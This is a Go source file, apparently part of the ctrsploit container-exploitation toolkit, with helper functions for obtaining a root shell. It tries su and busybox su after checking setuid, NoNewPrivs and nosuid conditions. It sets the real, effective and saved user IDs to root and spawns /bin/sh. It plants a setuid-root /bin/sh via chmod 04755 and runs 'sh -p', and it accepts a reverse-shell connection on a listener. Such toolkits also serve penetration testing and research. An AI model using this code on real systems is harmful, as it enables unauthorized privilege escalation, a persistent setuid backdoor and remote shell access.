package util

import (
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
)

type rootShellCandidate struct {
	label string
	path  string
	args  []string
}

func InvokeRootShellBySu() error {
	return InvokeRootShell(os.Stdin, os.Stdout, os.Stderr)
}

func InvokeRootShell(stdin io.Reader, stdout, stderr io.Writer) error {
	candidate, err := selectRootShellBySu(rootShellCandidates())
	if err != nil {
		return err
	}
	return invokeRootShellBySu([]rootShellCandidate{candidate}, stdin, stdout, stderr)
}

func CheckRootShellBySu() error {
	_, err := selectRootShellBySu(rootShellCandidates())
	return err
}

func CheckSetuidExecutionAllowed() error {
	return checkSetuidAllowed()
}

func CheckSetuidRootExecutable(path string) error {
	return checkSetuidRootExecutable(path)
}

func CheckRootOwnedSetuidExecutable(path string) error {
	return checkRootOwnedSetuidExecutable(path)
}

func rootShellCandidates() []rootShellCandidate {
	return []rootShellCandidate{
		{label: "su", path: "su", args: []string{"-", "root"}},
		{label: "/bin/su", path: "/bin/su", args: []string{"-", "root"}},
		{label: "/usr/bin/su", path: "/usr/bin/su", args: []string{"-", "root"}},
		{label: "busybox su", path: "busybox", args: []string{"su", "-", "root"}},
		{label: "/bin/busybox su", path: "/bin/busybox", args: []string{"su", "-", "root"}},
		{label: "/usr/bin/busybox su", path: "/usr/bin/busybox", args: []string{"su", "-", "root"}},
	}
}

func invokeRootShellBySu(candidates []rootShellCandidate, stdin io.Reader, stdout, stderr io.Writer) error {
	if len(candidates) == 0 {
		return errors.New("no su-compatible helper configured")
	}

	var failures []string
	seen := make(map[string]struct{}, len(candidates))
	for _, candidate := range candidates {
		path, err := resolveRootShellCommand(candidate.path)
		if err != nil {
			failures = append(failures, fmt.Sprintf("%s unavailable: %v", candidate.name(), err))
			continue
		}

		key := path + "\x00" + strings.Join(candidate.args, "\x00")
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}

		shell := exec.Command(path, candidate.args...)
		shell.Stdout = stdout
		shell.Stdin = stdin
		shell.Stderr = stderr
		if err := shell.Run(); err != nil {
			failures = append(failures, fmt.Sprintf("%s failed: %v", candidate.name(), err))
			continue
		}
		return nil
	}

	return fmt.Errorf("no su-compatible helper succeeded: %s", strings.Join(failures, "; "))
}

func selectRootShellBySu(candidates []rootShellCandidate) (rootShellCandidate, error) {
	if len(candidates) == 0 {
		return rootShellCandidate{}, errors.New("no su-compatible helper configured")
	}
	if err := checkSetuidAllowed(); err != nil {
		return rootShellCandidate{}, err
	}

	var failures []string
	seen := make(map[string]struct{}, len(candidates))
	for _, candidate := range candidates {
		path, err := resolveRootShellCommand(candidate.path)
		if err != nil {
			failures = append(failures, fmt.Sprintf("%s unavailable: %v", candidate.name(), err))
			continue
		}

		key := path + "\x00" + strings.Join(candidate.args, "\x00")
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}

		if err := checkSetuidRootExecutable(path); err != nil {
			failures = append(failures, fmt.Sprintf("%s unusable: %v", candidate.name(), err))
			continue
		}
		candidate.path = path
		return candidate, nil
	}

	return rootShellCandidate{}, fmt.Errorf("no su-compatible helper appears usable: %s", strings.Join(failures, "; "))
}

func resolveRootShellCommand(path string) (string, error) {
	if !strings.Contains(path, "/") {
		return exec.LookPath(path)
	}

	info, err := os.Stat(path)
	if err != nil {
		return "", err
	}
	if info.IsDir() {
		return "", fmt.Errorf("%s is a directory", path)
	}
	if info.Mode()&0o111 == 0 {
		return "", fmt.Errorf("%s is not executable", path)
	}
	return path, nil
}

func checkSetuidAllowed() error {
	if os.Geteuid() == 0 {
		return nil
	}

	content, err := os.ReadFile("/proc/self/status")
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return nil
		}
		return fmt.Errorf("check no_new_privs from /proc/self/status: %w", err)
	}
	for _, line := range strings.Split(string(content), "\n") {
		if strings.HasPrefix(line, "NoNewPrivs:") && strings.TrimSpace(strings.TrimPrefix(line, "NoNewPrivs:")) != "0" {
			return errors.New("current process has NoNewPrivs set, so setuid helpers cannot elevate privileges")
		}
	}
	return nil
}

func checkSetuidRootExecutable(path string) error {
	if err := checkExecutableFile(path); err != nil {
		return err
	}
	if os.Geteuid() == 0 {
		return nil
	}
	return checkRootOwnedSetuidExecutable(path)
}

func checkRootOwnedSetuidExecutable(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return err
	}
	if info.IsDir() {
		return fmt.Errorf("%s is a directory", path)
	}
	if info.Mode()&0o111 == 0 {
		return fmt.Errorf("%s is not executable", path)
	}

	stat, ok := info.Sys().(*syscall.Stat_t)
	if !ok {
		return fmt.Errorf("cannot inspect owner for %s", path)
	}
	if stat.Uid != 0 {
		return fmt.Errorf("%s is owned by uid %d, not root", path, stat.Uid)
	}
	if info.Mode()&os.ModeSetuid == 0 {
		return fmt.Errorf("%s is not setuid", path)
	}
	if err := checkNoSuidMount(path); err != nil {
		return err
	}
	return nil
}

func checkExecutableFile(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return err
	}
	if info.IsDir() {
		return fmt.Errorf("%s is a directory", path)
	}
	if info.Mode()&0o111 == 0 {
		return fmt.Errorf("%s is not executable", path)
	}
	return nil
}

func checkNoSuidMount(path string) error {
	mountPoint, options, err := mountInfoForPath(path)
	if err != nil {
		return err
	}
	for _, option := range strings.Split(options, ",") {
		if option == "nosuid" {
			return fmt.Errorf("%s is on nosuid mount %s", path, mountPoint)
		}
	}
	return nil
}

func mountInfoForPath(path string) (mountPoint, options string, err error) {
	content, err := os.ReadFile("/proc/self/mountinfo")
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return "", "", nil
		}
		return "", "", fmt.Errorf("read /proc/self/mountinfo: %w", err)
	}

	absPath, err := filepath.Abs(path)
	if err != nil {
		return "", "", err
	}
	bestLen := -1
	for _, line := range strings.Split(string(content), "\n") {
		fields := strings.Split(line, " ")
		if len(fields) < 6 {
			continue
		}
		candidate := unescapeMountInfoPath(fields[4])
		if !pathWithinMount(absPath, candidate) || len(candidate) <= bestLen {
			continue
		}
		bestLen = len(candidate)
		mountPoint = candidate
		options = fields[5]
	}
	return mountPoint, options, nil
}

func pathWithinMount(path, mountPoint string) bool {
	if mountPoint == "" {
		return false
	}
	cleanPath := filepath.Clean(path)
	cleanMountPoint := filepath.Clean(mountPoint)
	return cleanPath == cleanMountPoint || strings.HasPrefix(cleanPath, strings.TrimRight(cleanMountPoint, string(os.PathSeparator))+string(os.PathSeparator))
}

func unescapeMountInfoPath(path string) string {
	replacer := strings.NewReplacer(`\040`, " ", `\011`, "\t", `\012`, "\n", `\134`, `\`)
	return replacer.Replace(path)
}

func (candidate rootShellCandidate) name() string {
	if candidate.label != "" {
		return candidate.label
	}
	return strings.Join(append([]string{candidate.path}, candidate.args...), " ")
}

func InvokeRootShellBySetuid(i io.Reader, o, e io.Writer) (err error) {
	err = syscall.Setresuid(0, 0, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	err = syscall.Setresgid(0, 0, 0)
	awesome_error.CheckDebug(err)
	shell := exec.Command("/bin/sh")
	shell.Stdin = i
	shell.Stdout = o
	shell.Stderr = e
	err = shell.Run()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

// InvokeRootShellBySuid doest not work for busybox
func InvokeRootShellBySuid(i io.Reader, o, e io.Writer) (err error) {
	// Incorrect call:
	//     os.Chmod("/bin/dash", 06755)
	//
	// Why it fails:
	// os.Chmod applies
	//     mode & os.ModePerm          // keeps only 0o777
	// so the set-uid, set-gid and sticky bits (0o4000/0o2000/0o1000)
	// are silently discarded, turning 06755 into 0755.
	//
	// Correct approaches:
	// 1. Use syscall.Chmod / unix.Chmod, which preserve all bits, or
	// 2. Call os.Chmod for the regular permission bits, then add the
	//    special bits with a syscall.
	// e.g.
	// syscall.Chmod("/bin/dash", 06755)
	// os.Chmod("/bin/dash", os.ModePerm|os.ModeSetuid|os.ModeSetgid)
	err = syscall.Chmod("/bin/sh", 04755)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	// prevent the text-busy error caused by overlayfs's copy-up
	syscall.Sync()
	shell := exec.Command("/bin/sh", "-p")
	shell.Stdin = i
	shell.Stdout = o
	shell.Stderr = e
	err = shell.Run()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func ReceiveReverseShell(listener net.Listener) (err error) {
	conn, err := listener.Accept()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	defer conn.Close()
	log.Logger.Infof("received connection from %s", conn.RemoteAddr()) // Connection received
	go func() {
		io.Copy(os.Stdout, conn)
	}()
	io.Copy(conn, os.Stdin)
	return
}

func InvokeShellUnderDir(dir string, i io.Reader, o, e io.Writer) (err error) {
	shell := "/bin/sh"
	cmd := exec.Command(shell)
	cmd.Dir = dir
	cmd.Stdin = i
	cmd.Stdout = o
	cmd.Stderr = e
	awesome_error.CheckFatal(cmd.Start())
	return cmd.Wait()
}
